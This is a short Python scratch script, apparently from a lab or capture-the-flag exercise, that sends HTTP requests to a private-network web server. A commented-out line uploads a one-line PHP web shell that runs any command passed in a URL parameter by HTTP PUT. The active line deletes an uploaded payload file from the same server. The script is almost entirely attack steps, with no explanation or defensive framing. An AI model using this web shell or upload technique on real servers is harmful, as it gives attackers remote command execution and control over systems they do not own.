import requests

# request = requests.put("http://192.168.0.189/test/shell.php", data='<?php system($_GET["cmd"]) ?>' )
request = requests.delete("http://192.168.0.189/test/payload.php")

# r = requests.get("http://192.168.0.189/test/")

# print(r)